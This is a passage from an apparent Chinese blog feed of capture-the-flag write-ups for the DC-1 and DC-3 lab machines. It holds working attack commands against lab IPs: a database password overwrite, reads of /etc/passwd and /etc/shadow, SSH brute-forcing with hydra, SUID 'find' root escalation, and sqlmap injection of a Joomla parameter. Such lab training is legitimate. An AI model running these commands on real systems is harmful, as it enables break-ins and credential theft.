plan-text passwords enclosed by double quotes.”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912499494.png" alt="img"></p><p>得知这个信息之后，我们可以利用这个加密脚本中的加密方法构造一个已知用户名对应的对我们而言已知的新密码。进而替换users表格中的对象。</p><p>修改目标：将用户名为admin的密码修改为’admin‘</p><p>运行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php /var/www/scripts/password-hash.sh admin<br></code></pre></td></tr></table></figure><p>注：该条命令的意思是，运行该.sh脚本，生成明文密码是“admin”的hash加密密码值。</p><p><strong>plain-pass</strong>：admin</p><p><strong>encrypt-hash-pass：</strong></p><p>$S$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912714433.png" alt="img"></p><p>接下来就是回到数据库中将用户名为“admin”的密码改为我们新生成的hash密码值，即修改admin用户的密码为’admin‘。</p><p>mysql -udbuser -pR0ck3t</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br>update <span class="hljs-built_in">users</span> <span class="hljs-built_in">set</span> pass=<span class="hljs-string">&quot;$S<span class="hljs-variable">$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</span>&quot;</span> <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;admin&quot;</span> or name=<span class="hljs-string">&quot;Fred&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912949408.png" alt="img"></p><p>验证是否成功修改，<code>select * from users；</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913292131.png" alt="img"></p><p>- </p><p>退出mysql命令行使用<code>exit</code><br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913312573.png" alt="img"></p><p>- </p><p>使用”name：admin，pass：admin“去登陆目标ip网页。得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913355053.png" alt="img"></p><p>然后我们选择上方的”content“点击，查看其内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913389424.png" alt="img"></p><p>发现有个”flag3“，点击，得到如下效果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913374497.png" alt="img"></p><p>访问文件<code>/etc/passwd</code>获取相关系统用户信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913409356.png" alt="img"></p><p>解释：&#x2F;etc&#x2F;passwd文件中的每条信息包含了多个字段，各个字段之间使用冒号分隔开来。</p><blockquote><p>显示字段的语法：</p><p>用户名：密码占位符（通常是’x‘）：用户ID（UID）：组ID（GID）：用户描述：家目录：登陆shell</p></blockquote><p>接下来尝试访问<code>/etc/shadow</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure><p>由结果发现，由于权限不足，文件访问遭到拒绝：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240619125252692.png" alt="image-20240619125252692"></p><p>解释：&#x2F;etc&#x2F;shadow文件一般用于存储系统用户的加密密码及其相关的安全设置，通常只有系统管理员可以访问。</p><blockquote><p>显示字段的语法：（各字段使用冒号分隔）</p><p>用户名：加密密码：上次密码更改日期：密码更改最短间隔：密码更改最长间隔：密码过期警告天数：账户失效日期：保留字段</p><p>其中，加密密码通常使用的是’bcrypt’’SHA-256’或’SHA-512’等强哈希算法加密。</p></blockquote><p>回看上述获取的系统用户信息，发现近开头处有一个名为<code>root</code>的用户（doge&#x2F;），尝试使用字典爆破，看看能不能直接同时拿到登陆数据和提权。</p><p>切换回kali的root用户，使用hydra进行密码字典爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure><p>实际上，爆破的时间很长，而且，好像看不到结果（如下），所以想通过直接爆破root来获取登陆数据和实现提权是不大现实的。<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913636136.png" alt="img"></p><p>再看！近末尾处存在一个用户名为<code>flag4</code>的用户（为什么选中它就是！因为flag这个单词很熟，而且通常包含了关键信息）。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913619371.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure><p>很快地，就爆破出了这个用户的ssh登陆密码：</p><blockquote><p>flag4</p><p>orange</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913790835.png" alt="img"></p><blockquote><p>hydra（密码破解工具）使用语法：</p><p>hydra -l 单个用户名 -p 密码字典表 -e 超时重试次数 -t count -M file -T count1 -o outputfile -f pass1 -c t1 -w t2 -C t3 -R t4 -s 指定端口号 -x    -SuvVd46 其它选项 服务:&#x2F;&#x2F;服务：端口</p></blockquote><p>- </p><p><code>[-l LOGIN|-L FILE]</code>：指定单个用户名 <code>-l</code> 或从文件中读取用户名列表 <code>-L</code>。</p><p><code>[-p PASS|-P FILE]</code>：指定单个密码 <code>-p</code> 或从文件中读取密码列表 <code>-P</code>。</p><p><code>[-e ns]</code>：设置错误和超时的重试次数，默认为 5 次错误和 20 秒的超时。</p><p><code>[-t TASKS]</code>：同时运行的任务数，默认为 16。</p><p><code>[-M FILE]</code>：启用并行模式，从文件中读取主机列表。</p><p><code>[-T TASKS]</code>：每个主机并行任务数，默认为 16。</p><p><code>[-o FILE]</code>：将结果输出到文件。</p><p><code>[-f]</code>：强制使用指定的密码，即使它不工作。</p><p><code>[-c TIME]</code>：等待连接超时时间，默认为 30 秒。</p><p><code>[-w TIME]</code>：等待响应超时时间，默认为 30 秒。</p><p><code>[-C TIME]</code>：每个连接的间隔时间，默认为 0 秒。</p><p><code>[-R TIME]</code>：等待任务切换时间，默认为 0 秒。</p><p><code>[-s PORT]</code>：连接到指定端口，默认为服务的标准端口。</p><p><code>[-x MIN:MAX:CHARSET]</code>：使用指定的字符集生成密码。</p><p><code>[-SuvVd46]</code>：其他选项，例如静默模式 <code>-S</code>、详细输出 <code>-v</code>、非详细输出 <code>-V</code>、调试输出 <code>-d</code>、IPv6 支持 <code>-6</code> 等。</p><p><code>[service://server[:PORT][/OPT]]</code>：指定目标服务的协议、服务器地址和端口，以及可选的参数。</p><p>- </p><p>ok！登陆权限拿到！</p><p>返回靶机尝试登陆，发现能够成功以flag4用户的身份登陆。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913908123.png" alt="img"></p><h3 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h3><p>接下来进行提权，以获得更多有用的信息。</p><p>首先先使用<code>find</code>命令，查找具有SUID权限（拥有者&#x2F;管理者权限）的可执行二进制文件（通俗点理解就是命令，比如find这种）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>查找结果如下：</p><p>由查找结果可以发现，find命令也具有SUID权限，因而可以通过它实现提权。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913930750.png" alt="img"></p><p>输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name index.php -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;<br></code></pre></td></tr></table></figure><p>解释：命令意思是，使用find命令，通过执行 “&#x2F;bin&#x2F;sh”文件来查找名为index.php的文件。其中，查找什么文件不重要，关键是使用具有<code>SUID权限</code>的命令去调用执行<code>-exec &quot;/bin/sh&quot;</code>。</p><p>（注意末尾的符号也需要！而且需要有个空格！！！）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913967593.png" alt="img"></p><blockquote><p>&#x2F;bin&#x2F;sh文件：<br>是系统默认的命令行解释器，通常被称为’shell‘</p></blockquote><p>成功提权！此时也可以访问<code>/etc/shadow</code>（密码）文件了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913992790.png" alt="img"></p><p>结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DC1靶场攻打过程中使用到的相关关键操作技术：、</p><ul><li><p>首先先进行信息收集。使用<code>nmap</code>端口扫描收集开放端口信息。通过端口信息试图获取目标靶场的相关信息，比如所使用的框架等。</p></li><li><p>利用<code>msfconsole</code>寻找有关drupal CMS框架的漏洞，并利用漏洞重置<code>RHOSTS</code>字段值为目标靶机值，使用<code>run/exploit</code>命令执行。</p></li><li><p>获取shell，同样是通过<code>msfconsole</code>实现，输入<code>shell  -&gt;  ls</code>看是否成功列出目录文件，成功则表示get shell成功。输入命令<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>开启用户交互界面（即以靶机用户身份进行后续操作）</p></li><li><p>搜索靶机框架的配置文件名，搜索其下的所有相关配置文件，并<code>cat</code>查看文件内容，试图从中获取有用的信息。</p></li><li><p>获取数据库内容之后，使用命令<code>mysql -uName -pPassword</code>尝试登陆。</p></li><li><p>使用hydra进行密码爆破</p></li><li><p>提权，首先需要查找有SUID权限的命令，<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，然后执行<code>（SUID） / -name index.php -exec &quot;/bin/sh&quot; \;</code>进行提权。</p></li><li><p>检测权限属主的命令为<code>whoami和id</code></p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-3</title>
    <link href="/2024/07/24/DC-3/"/>
    <url>/2024/07/24/DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>首先，必须先确定测试机器（kali）和目标靶机处于同一个模式（这里使用NAT模式）。否则在kali端扫不出目标靶机的IP地址。</p><p>- </p><p>此外，在本次在虚拟机打开靶机的过程中，遇到了一个问题：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701215940440.png" alt="image-20240701215940440"></p><p>解决方法（亲测有用）：将CD&#x2F;DVD（IDE）选项的<code>IDE（D）</code>修改为<code>IDE 0：0</code>。</p><p><a href="https://developer.aliyun.com/article/1209515">https://developer.aliyun.com/article/1209515</a></p><p>- </p><p>然后通过开关靶机以及进行nmap网段扫描来确定靶机的IP地址。</p><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222633001.png" alt="image-20240701222633001"></p><p>开靶机后：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222702232.png" alt="image-20240701222702232"></p><p>通过前后nmap扫描结果的对比，可以确认目标靶机的IP地址是：<code>192.168.204.132</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="开放端口扫描"><a href="#开放端口扫描" class="headerlink" title="开放端口扫描"></a>开放端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.132<br>nmap -sT -p- 192.168.204.132<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701224802419.png" alt="image-20240701224802419"></p><p>由检测结果可以看出，目标靶机开放的端口服务只有<code>80</code>端口（http协议）。接下来进行更加详细的端口扫描。</p><h3 id="详细端口扫描"><a href="#详细端口扫描" class="headerlink" title="详细端口扫描"></a>详细端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701230223132.png" alt="image-20240701230223132"></p><p>可以看到，其开放的80端口服务有http网页相关内容的信息。但除此之外没有其它有用的信息了。所以我们可以再进行nmap漏扫，尝试获取更多有价值的信息。</p><h3 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110519853.png" alt="image-20240702110519853"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110540612.png" alt="image-20240702110540612"></p><p>发现可能这个目标靶机网页可能存在着：</p><p><code>Joomla 中的SQL注入漏洞</code>：(SQL Injection Vulnerability)</p><blockquote><p> An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers to execute aribitrary SQL commands via unspecified vectors.</p><p> 在Joomla中存在一个SQL注入漏洞，3.7版本在3.7.1之前它允许攻击者使用未指明的变量去执行任意SQL命令。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111339383.png" alt="image-20240702111339383"></p><p><code>DOS攻击漏洞</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111629174.png" alt="image-20240702111629174"></p><p><code>csrf漏洞</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110758621.png" alt="image-20240702110758621"></p><p>扫描结果列举了可能存在csrf漏洞的目录：</p><blockquote><p>&#x2F;index.php</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;remind.remind&amp;Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;reset.request&amp;Itemid&#x3D;101</p></blockquote><table><thead><tr><th align="left">csrf漏洞：CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</th></tr></thead></table><h2 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h2><h3 id="访问目标靶机"><a href="#访问目标靶机" class="headerlink" title="访问目标靶机"></a>访问目标靶机</h3><p>在浏览器访问目标靶机的IP地址<code>192.168.204.132</code></p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702104858844.png" alt="image-20240702104858844"></p><p>其中的提示信息为：</p><blockquote><p>This time, there is only one flag, one entry point and no clues.</p><p>To get the flag, you’ll obviously have to gain root privileges.</p><p>How you get to be root is up to you - and, obviously, the system.</p><p>Good luck - and I hope you enjoy this little challenge.</p><p>这次只有一个flag，一个入口并且没有提示。为了获取flag，你需要获得root权限。如何获得root权限取决于你自己，当然，也取决于系统。祝你好运，我希望你能享受这个挑战。</p></blockquote><h3 id="指纹工具识别技术构成"><a href="#指纹工具识别技术构成" class="headerlink" title="指纹工具识别技术构成"></a>指纹工具识别技术构成</h3><p>使用浏览器插件<code>Wappalyzer</code>进行指纹识别，进行网页技术构成识别。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702113249330.png" alt="image-20240702113249330"></p><p>可以看到，这个网页使用的是<strong>Joomla CMS</strong>框架，Joomia在前面进行nmap漏扫的时候也出现过捏！使用的编程语言是<strong>PHP</strong>，操作系统是<strong>Ubuntu</strong>。</p><h2 id="gubuster目录爆破"><a href="#gubuster目录爆破" class="headerlink" title="gubuster目录爆破"></a>gubuster目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.132 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702184616071.png" alt="image-20240702184616071"></p><p>得到的目录信息：</p><blockquote><p> <a href="http://192.168.204.132/media/">http://192.168.204.132/media/</a></p><p> <a href="http://192.168.204.132/templates/">http://192.168.204.132/templates/</a></p><p> <a href="http://192.168.204.132/modules/">http://192.168.204.132/modules/</a></p><p> <a href="http://192.168.204.132/images/">http://192.168.204.132/images/</a></p><p> <a href="http://192.168.204.132/bin/">http://192.168.204.132/bin/</a></p><p> <a href="http://192.168.204.132/plugins/">http://192.168.204.132/plugins/</a></p><p> <a href="http://192.168.204.132/includes/">http://192.168.204.132/includes/</a></p><p> <a href="http://192.168.204.132/language/">http://192.168.204.132/language/</a></p><p> <a href="http://192.168.204.132/components/">http://192.168.204.132/components/</a></p><p> <a href="http://192.168.204.132/cache/">http://192.168.204.132/cache/</a></p><p> <a href="http://192.168.204.132/libraries/">http://192.168.204.132/libraries/</a></p><p> <a href="http://192.168.204.132/tmp/">http://192.168.204.132/tmp/</a></p><p> <a href="http://192.168.204.132/layouts/">http://192.168.204.132/layouts/</a></p><p> <a href="http://192.168.204.132/administrator/">http://192.168.204.132/administrator/</a></p><p> <a href="http://192.168.204.132/cli/">http://192.168.204.132/cli/</a></p></blockquote><p>发现了管理员目录，即后台管理系统 <code>http://192.168.204.132/administrator/</code>欸！！</p><p>试着在网页进行访问：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702185113830.png" alt="image-20240702185113830"></p><p>接下来的思路是寻找可通过认证的用户账号，即用户名和密码。</p><h2 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p>使用<code>searchsploit</code>进行漏洞搜索。</p><p>- </p><p>在前面两个靶场中，我们都是使用kali自带的msfconsole来进行漏洞查询，那为什么在这个靶场就要使用searchsploit了呢？searchsploit和msfconsole有什么区别？</p><blockquote><ul><li><p>searchsploit</p><p>功能：用于搜索漏洞利用代码，是一个命令行工具。</p><p>用途：主要用于查找已知漏洞的利用代码。</p></li><li><p>msfconsole</p><p>功能：是metasploit框架的命令行接口，包含了大量的漏洞利用模块。</p><p>用途：主要用于执行漏洞渗透测试活动，包括选择合适的漏洞利用模块，设置payload，执行渗透攻击，获取远程访问权限等。</p></li></ul></blockquote><p>- </p><p>前面 nmap漏扫 以及 后面的 gubuster目录爆破的后台管理界面 已经提示得不能再明显了，是Joomla！所以此处我们直接针对这个漏洞使用searchsploit。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla<br></code></pre></td></tr></table></figure><p>找到非常多该漏洞的可利用代码文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191749731.png" alt="image-20240702191749731"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191823709.png" alt="image-20240702191823709"></p><p>根据前面进行nmap漏扫得到的结果显示，目标靶机使用的Joomla版本为3.7.0。因此，我们可以进行更详细的searchsploit搜索。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla 3.7.0<br></code></pre></td></tr></table></figure><p>得到的结果很精炼，可以利用SQL注入以及CSS攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702192127253.png" alt="image-20240702192127253"></p><p>查看其详细信息：</p><p>如何查看<code>php/webapps/42033.txt</code>以及<code>php/webapps/43488.txt</code>代码文件？</p><p>答：使用searchsploit。使用<code>searchsploit -p 42033/43488.txt </code> 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 42033.txt<br>searchsploit -p 43488.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193128571.png" alt="image-20240702193128571"></p><p>在详细信息中，可利用代码文件的路径path被展示出来。</p><ul><li>SQL注入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>  /usr/share/exploitdb/exploits/php/webapps/42033.txt   <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193539768.png" alt="image-20240702193539768"></p><p>可以从中得到该SQL注入漏洞利用的使用方法，利用sqlmap：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><ul><li>CSS攻击</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/exploitdb/exploits/php/webapps/43488.txt  <br></code></pre></td></tr></table></figure><blockquote><p>CSS攻击是一种利用浏览器对CSS的解析和应用来实施的安全攻击。通过利用浏览器在渲染网页时对CSS的强大控制能力，通过构造恶意的CSS代码来实现攻击的目的。常见的CSS攻击方式有：CSS注入攻击、CSS选择器攻击、CSS历史攻击、针对特定浏览器漏洞的攻击等等。</p></blockquote><p>有关于该漏洞利用的概要介绍为:</p><blockquote><ol><li>Description（描述）</li></ol><p>Whenever a user edits a message with &lt;\textarea&gt; inside the body, everything after the &lt;\textarea&gt; will be executed in the user’s browser. Works with every version up to 4.0.20</p><p>无论何时用户在正文中使用&lt;\textarea&gt;编辑信息时，&lt;\textarea&gt;时候的任意内容都会在用户的浏览器中被执行。这一特性适用于4.0.20之前的版本。</p><ol start="2"><li>Proof of Concept（概念验证）</li></ol><p>Login with permissions to post a message, insert &lt;\textarea&gt; in the body and add any html code after that, whenever a user tries to edit that message the code writed after you closed the textarea will be executed</p><p>获取相应权限登陆以发布信息，在主体中插入 &lt;\textarea&gt; 并在它后面添加任意html代码，无论何时用户尝试去编辑这些信息，那些被写在 &lt;\textarea&gt; 后面的代码都会被执行。</p><ol start="3"><li>Solution:（解决方案）</li></ol><p>Update to version 4.0.21<br><a href="https://stackideas.com/blog/easydiscuss4021-update">https://stackideas.com/blog/easydiscuss4021-update</a></p><p>将版本更新到4.0.21</p></blockquote><h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><p>意思意思吧，万一有比SQL注入更简便的方法呢？或许直接有用户的数据库呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>search Joomla<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702200337335.png" alt="image-20240702200337335"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202047792.png" alt="image-20240702202047792"></p><p>可以看到，有关于Joomla的漏洞还挺多！</p><p>在前面的nmap漏扫，以及上面的searchsploit（附带版本号）的查询结果，都提到了SQL注入。</p><p>在上述msfconsole的搜索结果中，在rank等级为<code>excellent</code>，又比较新的漏洞中查找有关于SQL注入的漏洞，并尝试利用它：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202404808.png" alt="image-20240702202404808"></p><p>好！6号漏洞<code>exploit/unix/webapp/joomla_comfields_sqli_rce </code>申请出战！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/joomla_comfields_sqli_rce<br><br>show options<br><br><span class="hljs-built_in">set</span> RHOSTS 192.168.204.132<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202620785.png" alt="image-20240702202620785"></p><p>执行<code>run/exploit</code>:<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202723977.png" alt="image-20240702202723977"></p><p>发现均没有 session 被创建，即利用失败！对<code>msfconsole</code>搜索出来的漏洞利用失败，所以我们还是得回去尝试通过<code>searchsploit</code>搜索得到的可利用代码文件以及利用方法了。</p><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>根据上一节<code>searchsploit</code>搜索得到的信息对目标靶机进行sqlmap注入测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>--dbs</code>：指示 sqlmap 列出目标数据库服务器中的所有数据库</p><p>注入结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702203426962.png" alt="image-20240702203426962"></p><p>失败了。。。。。？？？？</p><p>哦！注意！利用文件中给出的利用方法中，给出的URL中的<code>localhost</code>字段需要自己手动修改成目标靶机的IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702204349894.png" alt="image-20240702204349894"></p><p>得到的信息有：</p><blockquote><p>可用的数据库有：</p><p>information_schema<br><strong>joomladb</strong>    <strong>！！！！</strong><br>mysql<br>performance_schema<br>sys</p></blockquote><p>对其中最可能含有有价值信息的joomladb数据库进行进一步的访问，指定列出joomladb数据库的所有表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-u</code>：指明目标URL</p><p><code>-D</code>：指定目标数据库的名称</p><p><code>--riks</code>：设置SQL注入的风险级别，数字越高表示尝试更高风险的注入测试。</p><p><code>--level</code>：设置测试的深度级别，数字越高表示尝试更深入的注入测试。</p><p><code>--random-agent</code>该参数使得每次请求都使用一个随机的User-Agent头部，这有助于隐藏 sqlmap 的请求特征，增加匿名性。</p><p><code>--tables</code>：参数指示sqlmap列出目标数据库中的所有表名。</p><p><code>-P list[fullordering]</code>：-p参数指定了用于注入的URL参数名：list[fullordering]这是一个潜在的注入点，sqlmap将尝试利用这个参数进行SQL注入测试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235531424.png" alt="image-20240702235531424"></p><p>一共有76张表table呢！在其中发现了一个名为<code>users</code>的表，尝试访问。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235648824.png" 